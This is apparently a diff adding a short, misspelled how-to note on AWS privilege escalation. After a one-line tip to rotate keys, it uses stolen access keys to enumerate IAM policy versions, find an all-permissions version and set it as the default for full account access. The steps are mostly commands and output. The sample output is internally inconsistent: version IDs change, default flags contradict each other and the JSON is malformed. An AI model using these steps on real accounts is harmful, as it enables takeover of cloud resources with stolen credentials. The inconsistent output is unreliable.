@@ -1,0 +1,68 @@
+How to do prvilege escalation on AWS..
+
+1 - rotate your keys often! (use hashicorp vault or a KMS)
+
+If keys are put into the wrong hands, and IAM is configured incorrectly, one can easily apply privliege escalation. 
+
+For example: If I stolen a AK & SK from a AWS user. I can easily do the following.
+
+aws configure
+ACCESS KEY = *****
+SECRET KEY = *****
+
+aws iam list-attached-user-policies --user-name <stolen_user> --profile <stolen_user>
+
+OUTPUT would be a json output of "attachedPolicies" with a policy name and ARN.
+
+This ARN can be used to then attempt to find old version of the policy "if configured incorrectly..."
+
+aws iam list-policy-versions --policy-arn <auto generated arn> --profile <stolen_username>
+OUTPUT!
+{
+    "Versions": [
+        {
+            "VersionId": "final",
+            "IsDefaultVersion": false,
+            "CreateDate": "2019-12-13T20:09:33Z"
+        },
+        {
+            "VersionId": "test",
+            "IsDefaultVersion": false,
+            "CreateDate": "2019-12-13T20:09:33Z"
+        },
+    ]
+}
+
+
+
+
+
+
+Now I can comb through each policy version.... 
+
+aws iam get-policy-version --policy-arn <auto generated arn> --version-id test  --profile <stolen_user>
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": "*",
+                    "Effect": "Allow",
+                    "Resource": "*"
+                }
+            ]
+        },
+        "VersionId": "v2",
+        "IsDefaultVersion": true,
+        "CreateDate": "2019-12-13T20:09:33Z"
+    }
+}
+
+
+Now I can change the stolen user default policy back and have full aws access to all resources. 
+aws iam set-default-policy-version --policy-arn arn:<auto generated arn>  --version-id test --profile <stole_user>
+
+
+
+
